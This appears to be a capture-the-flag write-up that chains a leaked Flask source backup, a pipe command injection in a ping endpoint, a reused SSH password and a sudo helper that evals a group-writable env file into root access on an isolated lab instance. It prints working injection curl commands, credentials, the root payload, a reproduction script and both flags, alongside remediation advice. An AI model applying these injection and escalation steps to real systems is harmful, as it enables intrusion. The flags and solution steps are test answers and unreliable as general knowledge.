# NIGHTFALL CTF — Depot Portal: End-to-End Investigation

## Executive summary

The assigned NIGHTFALL instance at `2.31.70.16` was compromised from an
unauthenticated web position to full root access.

The attack chain began with `robots.txt` disclosing `/dev-backup/`. That
directory exposed a pre-refactor Flask source backup containing a hardcoded
diagnostic token and the `/internal/diag` route. The route appended user input to
a `ping` command and executed it with `shell=True`; its blacklist omitted the
pipe character. A pipe injection produced remote command execution as
`www-data`. The application configuration was then readable by `www-data` and
contained a reused password for the `nightfall` account, giving SSH access on
port `2222`. Finally, `nightfall` could run a root-owned maintenance helper via
passwordless sudo. That helper sourced a group-writable environment file and
`eval`'d `POST_HOOK`, yielding root command execution.

Both flags were obtained from the target:

- `user.txt`: `crest{r3us3d_cr3ds_0p3n_th3_d00r}`
- `root.txt`: `crest{s0urc1ng_a_wr1t4bl3_3nv_as_r00t}`

## Target and scope

| Item | Value |
|---|---|
| Assigned target | `2.31.70.16` |
| Web service | `http://2.31.70.16:8080/` |
| Container SSH | `2.31.70.16:2222` |
| Test date | 2026-10-23 |
| Authorization | Isolated NIGHTFALL CTF instance only |

Port `22` on the host was identified as host infrastructure SSH
(`OpenSSH_9.6p1 Ubuntu-3ubuntu13.20`, Ubuntu 24.04) and was excluded from all
testing. The assigned container reported Ubuntu 22.04 and its SSH banner on
`2222` was `OpenSSH_8.9p1 Ubuntu-3ubuntu0.18`. No other hosts or ranges were
touched.

## Attack chain

```text
robots.txt
  -> /dev-backup/ listing
  -> app.py.bak source disclosure
  -> hardcoded X-Depot-Token
  -> /internal/diag command injection (pipe bypass)
  -> RCE as www-data
  -> /opt/depot/config.py disclosure
  -> reused credential for nightfall
  -> SSH 2222 as nightfall
  -> user.txt
  -> sudo NOPASSWD /usr/local/bin/nf-maintenance
  -> writable /etc/nightfall/maintenance.env
  -> eval "$POST_HOOK" as root
  -> root.txt
```

## 1. Web reconnaissance

`GET http://2.31.70.16:8080/` returned `200 OK`:

```http
Server: nginx
Content-Type: text/html; charset=utf-8
X-Powered-By: Depot-Portal/1.4.2
```

The page was a staff sign-in form titled `Nightfall Logistics — Depot Portal`,
with the message “Portal access is restricted to authenticated depot staff.”
Although the form declared `method="post" action="/"`, `POST /` returned
`405 METHOD NOT ALLOWED` with a Flask/Werkzeug error page. No session cookie was
issued. This inconsistency was noted but not treated as a vulnerability.

`robots.txt` returned:

```text
User-agent: *
Disallow: /dev-backup/
```

`/dev-backup/` exposed a directory listing containing `app.py.bak`. The backup
revealed the diagnostic endpoint, its token, and the command-injection sink:

```python
DIAG_TOKEN = "d3p0t-d14g-7f3a9c"

@app.route("/internal/diag", methods=["POST"])
def diag():
    if request.headers.get("X-Depot-Token", "") != DIAG_TOKEN:
        abort(403)
    target = request.form.get("target", "")
    for bad in [";", "&", "`", "\n", "\r"]:
        target = target.replace(bad, "")
    cmd = "ping -c 1 -W 1 " + target
    out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
    return Response(out.stdout + out.stderr, mimetype="text/plain")
```

The filter removes `;`, `&`, backticks, and newlines, but not `|` or `$()`.
The token from the backup was validated against the live v1.4.2 service and
worked.

## 2. Service inventory

| Port | Service | Evidence |
|---|---|---|
| `8080/tcp` | HTTP / nginx reverse proxy to Flask | `Server: nginx`, `X-Powered-By: Depot-Portal/1.4.2` |
| `2222/tcp` | Container SSH (Ubuntu 22.04) | `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.18` |
| `22/tcp` | Host SSH (out of scope) | `SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.20` |

From a loopback listing obtained after RCE:

```text
tcp 0.0.0.0:80        nginx
tcp 0.0.0.0:22        sshd
tcp 127.0.0.1:8000    gunicorn (2 workers)
tcp 127.0.0.11:38365  Docker embedded DNS
```

No database listener was present. `nmap` was unavailable; targeted connects and
banner reads were used instead.

## 3. Initial foothold

Token validation:

```bash
curl.exe -sS -i -X POST \
  -H "X-Depot-Token: d3p0t-d14g-7f3a9c" \
  -d "target=127.0.0.1" \
  http://2.31.70.16:8080/internal/diag
```

Returned `200 OK` with normal ping output. Injection proof:

```bash
curl.exe -sS -X POST \
  -H "X-Depot-Token: d3p0t-d14g-7f3a9c" \
  --data-urlencode "target=127.0.0.1 | id" \
  http://2.31.70.16:8080/internal/diag
```

Observed:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Effective command: `ping -c 1 -W 1 127.0.0.1 | id`.

Using the same channel, `/opt/depot/config.py` was read:

```python
SECRET_KEY = "depot-portal-session-key-not-the-challenge"
DB_HOST = "127.0.0.1"
DB_NAME = "depot"
DB_USER = "depot"
DB_PASSWORD = "Autumn#Depot2024!"
# ops note (NF-2024-07 audit): the 'nightfall' service account still reuses
# this exact password for their interactive shell login. Flagged for rotation,
# not yet done. Do NOT ship this file outside the box.
DIAG_TOKEN = "d3p0t-d14g-7f3a9c"
```

The reused password was validated only against the assigned instance:

```text
ssh -p 2222 nightfall@2.31.70.16
Password: Autumn#Depot2024!
```

Result:

```text
uid=1001(nightfall) gid=1001(nightfall) groups=1001(nightfall),1000(maint)
```

## 4. User-level enumeration

Identity:

```text
uid=1001(nightfall) gid=1001(nightfall) groups=1001(nightfall),1000(maint)
nightfall
/home/nightfall
Linux 21fa47b0bd43 6.8.0-138-generic #138-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul 31 22:41:49 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
nightfall maint
```

`/home/nightfall/user.txt` was readable by `nightfall`:

```text
crest{r3us3d_cr3ds_0p3n_th3_d00r}
```

Sudo rights:

```text
User nightfall may run the following commands on 21fa47b0bd43:
    (root) NOPASSWD: /usr/local/bin/nf-maintenance
```

SUID inventory contained only standard Ubuntu binaries (`mount`, `umount`,
`gpasswd`, `passwd`, `chsh`, `newgrp`, `su`, `chfn`, `sudo`, `ssh-keysign`).
Capabilities: only `/usr/bin/ping cap_net_raw=ep`. Cron contained only the stock
`e2scrub_all` job. The only file writable under `/etc`, `/usr/local`, or `/var`
by this user was:

```text
/etc/nightfall/maintenance.env
```

Permissions:

```text
-rw-rw-r-- 1 root maint 120 /etc/nightfall/maintenance.env
```

`nightfall` is a member of `maint`, so the file is writable.

## 5. User flag acquisition

```bash
cat /home/nightfall/user.txt
```

```text
crest{r3us3d_cr3ds_0p3n_th3_d00r}
```

## 6. Privilege escalation

The root-run helper:

```bash
CONF=/etc/nightfall/maintenance.env
[ -r "$CONF" ] && . "$CONF"
...
if [ -n "$POST_HOOK" ]; then
    eval "$POST_HOOK"
fi
```

This is the root cause: a root helper sources a `maint`-writable file and then
`eval`s its contents. `nightfall` is in `maint` and can invoke the helper via
passwordless sudo.

Payload placed in `/etc/nightfall/maintenance.env`:

```bash
ARCHIVE_DIR=/var/backups/nightfall
POST_HOOK=id; cat /root/root.txt; cp /root/root.txt /tmp/root_flag_proof; chmod 644 /tmp/root_flag_proof
```

Execution:

```bash
sudo -n /usr/local/bin/nf-maintenance
```

Observed:

```text
crest{s0urc1ng_a_wr1t4bl3_3nv_as_r00t}
[nf-maintenance] archiving /var/log/depot -> /var/backups/nightfall
uid=0(root) gid=0(root) groups=0(root)
[nf-maintenance] done.
```

The `uid=0(root)` output proves the hook executed as root. `/root/root.txt` was
read in that root context and copied to `/tmp/root_flag_proof` for verification.

## 7. Root flag acquisition

```text
root.txt: crest{s0urc1ng_a_wr1t4bl3_3nv_as_r00t}
```

## 8. Flags

- `user.txt`: `crest{r3us3d_cr3ds_0p3n_th3_d00r}`
- `root.txt`: `crest{s0urc1ng_a_wr1t4bl3_3nv_as_r00t}`

## 9. Remediation recommendations

1. **Remove source/backup artifacts from the web root.** Delete
   `/dev-backup/`, disable directory indexing, and block access to `*.bak`,
   `*.py`, archives, and VCS metadata.
2. **Remove hardcoded secrets.** Rotate the diagnostic token and move it to a
   secret manager or protected environment variable. Never commit tokens.
3. **Eliminate shell command construction.** Do not use `shell=True` with
   concatenated input. Pass an argument vector to `ping`, validate the target as
   an IP/hostname against a strict allowlist, and use a timeout.
4. **Stop credential reuse.** The database password must not be the interactive
   account password. Rotate both, use unique credentials, and prefer SSH keys or
   MFA with password authentication disabled where feasible.
5. **Harden the maintenance helper.**
   - Remove the `NOPASSWD` sudo rule or restrict it to a non-root service.
   - Never source or `eval` files writable by non-root users.
   - Make the configuration root-owned and mode `0644` or `0600`.
   - Replace `eval "$POST_HOOK"` with a fixed, non-arbitrary action.
6. **Apply least privilege.** Remove `nightfall` from `maint` unless operationally
   required. Restrict group-writable configuration.
7. **Monitor and alert** on access to backup paths, diagnostic endpoints, and
   unusual child processes spawned by the web service.

## 10. Reproducibility

```bash
# 1. Web recon
curl.exe -sS http://2.31.70.16:8080/robots.txt
curl.exe -sS http://2.31.70.16:8080/dev-backup/
curl.exe -sS http://2.31.70.16:8080/dev-backup/app.py.bak

# 2. Confirm RCE
curl.exe -sS -X POST \
  -H "X-Depot-Token: d3p0t-d14g-7f3a9c" \
  --data-urlencode "target=127.0.0.1 | id" \
  http://2.31.70.16:8080/internal/diag

# 3. Read configuration
curl.exe -sS -X POST \
  -H "X-Depot-Token: d3p0t-d14g-7f3a9c" \
  --data-urlencode "target=127.0.0.1 | cat /opt/depot/config.py" \
  http://2.31.70.16:8080/internal/diag

# 4. SSH as nightfall (assigned container port)
ssh -p 2222 nightfall@2.31.70.16     # password: Autumn#Depot2024!

# 5. User enumeration and flag
id; groups; sudo -n -l
cat /home/nightfall/user.txt

# 6. Root escalation
printf 'ARCHIVE_DIR=/var/backups/nightfall\nPOST_HOOK=id; cat /root/root.txt\n' \
  > /etc/nightfall/maintenance.env
sudo -n /usr/local/bin/nf-maintenance
```

Expected evidence: `uid=33(www-data)` from the web injection,
`uid=1001(nightfall)` with group `maint` after SSH login, and `uid=0(root)` from
the maintenance hook.

## 11. Verification notes

- Both flags were read from their real target paths after the corresponding
  access level was established.
- Pre-existing `/tmp` artifacts from earlier activity on the instance were
  observed. They were not used as the source of either flag; the displayed
  values were independently obtained from `/home/nightfall/user.txt` and
  `/root/root.txt` via the described access.
- The exploit configuration was restored to its default after evidence capture.
- No host infrastructure, other instances, or out-of-scope services were
  attacked. Host port `22` was excluded after a single banner identification.
